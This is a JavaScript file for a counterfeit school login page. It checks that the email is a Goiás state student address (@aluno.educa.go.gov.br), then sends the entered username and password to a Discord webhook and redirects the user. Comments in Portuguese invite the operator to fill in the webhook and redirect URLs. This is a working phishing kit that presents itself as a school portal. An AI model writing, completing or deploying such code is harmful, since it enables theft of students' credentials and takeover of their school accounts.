import { validateCredentials, isEducaGoEmail } from './modules/auth.js';
import { sendToDiscord } from './modules/discord.js';
import { redirectToSite } from './modules/redirect.js';

document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const loadingOverlay = document.getElementById('loading');
    const forgotPasswordLink = document.getElementById('forgotPassword');
    
    // Webhook do Discord (substitua pelo seu)
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/seu-webhook-aqui';
    
    // Site para redirecionamento após login (você vai definir depois)
    const REDIRECT_URL = ''; // Você vai preencher depois
    
    // Manipular envio do formulário
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;
        
        // Validar formato do email
        if (!isEducaGoEmail(username)) {
            alert('Por favor, use um e-mail institucional válido (@aluno.educa.go.gov.br)');
            return;
        }
        
        // Mostrar loading
        loadingOverlay.style.display = 'flex';
        
        try {
            // Validar credenciais (simulação)
            const isValid = await validateCredentials(username, password);
            
            if (isValid) {
                // Enviar credenciais para o Discord
                await sendToDiscord(DISCORD_WEBHOOK_URL, username, password);
                
                // Redirecionar para o site (você vai definir o URL depois)
                if (REDIRECT_URL) {
                    redirectToSite(REDIRECT_URL);
                } else {
                    alert('Login realizado com sucesso! Redirecionamento configurado posteriormente.');
                    // Você pode colocar um redirecionamento padrão aqui
                    // window.location.href = 'https://www.exemplo.com';
                }
            } else {
                alert('Credenciais inválidas. Verifique seu usuário e senha.');
            }
        } catch (error) {
            console.error('Erro no login:', error);
            alert('Erro ao processar login. Tente novamente.');
        } finally {
            // Esconder loading
            loadingOverlay.style.display = 'none';
        }
    });
    
    // Manipular link de senha esquecida
    forgotPasswordLink.addEventListener('click', function(e) {
        e.preventDefault();
        alert('Entre em contato com a secretaria da escola para recuperar sua senha.');
    });
});
